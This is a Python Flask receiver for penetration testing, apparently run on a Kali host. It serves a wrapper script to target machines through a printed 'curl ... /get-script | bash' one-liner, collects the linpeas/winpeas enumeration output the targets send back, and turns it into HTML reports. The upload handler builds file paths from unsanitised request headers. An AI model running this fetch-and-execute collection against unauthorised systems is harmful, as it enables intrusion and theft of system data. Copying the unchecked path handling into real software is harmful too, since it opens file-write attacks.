#!/usr/bin/env python3
"""
ParsingPeas Receiver - Kali Host Server
Receives linpeas/winpeas output and generates interactive HTML reports
"""

import os
import hashlib
import time
from flask import Flask, request, jsonify, send_from_directory, render_template_string
from datetime import datetime
import json

app = Flask(__name__)

# Configuration
OUTPUT_DIR = "./received_outputs"
REPORTS_DIR = "./reports"
MAX_UPLOAD_SIZE = 500 * 1024 * 1024  # 500MB

# Create directories
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(REPORTS_DIR, exist_ok=True)

# Active sessions tracking
active_sessions = {}


@app.route('/')
def index():
    """Status page showing active sessions and reports"""
    reports = [f for f in os.listdir(REPORTS_DIR) if f.endswith('.html')]
    return f"""
    <html>
    <head><title>ParsingPeas - Active</title></head>
    <body style="font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px;">
        <h1>🟢 ParsingPeas Receiver Active</h1>
        <p>Server is running and ready to receive linpeas/winpeas output</p>
        <h2>Active Sessions: {len(active_sessions)}</h2>
        <h2>Generated Reports: {len(reports)}</h2>
        <ul>
        {''.join([f'<li><a href="/reports/{r}" style="color: #00ff00;">{r}</a></li>' for r in reports])}
        </ul>
        <hr>
        <p>To use: <code>curl -sSL http://{request.host}/get-script | bash</code></p>
    </body>
    </html>
    """


@app.route('/get-script')
def get_script():
    """Serve the wrapper script to target machine"""
    with open('wrapper.sh', 'r') as f:
        script = f.read()
    # Replace placeholder with actual server URL
    script = script.replace('KALI_SERVER_URL', f'http://{request.host}')
    return script, 200, {'Content-Type': 'text/plain'}


@app.route('/upload', methods=['POST'])
def upload():
    """Receive linpeas/winpeas output"""
    try:
        # Get session info
        session_id = request.headers.get('X-Session-ID', f'session_{int(time.time())}')
        hostname = request.headers.get('X-Hostname', 'unknown')
        scan_type = request.headers.get('X-Scan-Type', 'linpeas')
        
        # Get the data
        data = request.get_data()
        
        if len(data) == 0:
            return jsonify({'error': 'No data received'}), 400
        
        # Calculate checksum
        checksum = hashlib.md5(data).hexdigest()
        
        # Save raw output
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{scan_type}_{hostname}_{timestamp}.txt"
        filepath = os.path.join(OUTPUT_DIR, filename)
        
        with open(filepath, 'wb') as f:
            f.write(data)
        
        file_size = len(data)
        
        print(f"[+] Received {scan_type} output from {hostname}")
        print(f"[+] Size: {file_size / 1024:.2f} KB")
        print(f"[+] Checksum: {checksum}")
        print(f"[+] Saved to: {filepath}")
        
        # Parse and generate HTML report
        print(f"[+] Generating HTML report...")
        from parser import generate_html_report
        report_path = generate_html_report(filepath, hostname, scan_type)
        
        print(f"[+] Report generated: {report_path}")
        print(f"[+] View at: http://{request.host}/reports/{os.path.basename(report_path)}")
        
        return jsonify({
            'status': 'success',
            'session_id': session_id,
            'filename': filename,
            'size': file_size,
            'checksum': checksum,
            'report_url': f"/reports/{os.path.basename(report_path)}"
        }), 200
        
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return jsonify({'error': str(e)}), 500


@app.route('/reports/<filename>')
def serve_report(filename):
    """Serve generated HTML reports"""
    return send_from_directory(REPORTS_DIR, filename)


@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'active_sessions': len(active_sessions)})


if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════╗
    ║       ParsingPeas Receiver v1.0       ║
    ║   Automated linpeas/winpeas Parser    ║
    ╚═══════════════════════════════════════╝
    """)
    print(f"[+] Output directory: {OUTPUT_DIR}")
    print(f"[+] Reports directory: {REPORTS_DIR}")
    print(f"[+] Starting server...\n")
    
    # Run on all interfaces, port 8000
    app.run(host='0.0.0.0', port=8000, debug=False, threaded=True)
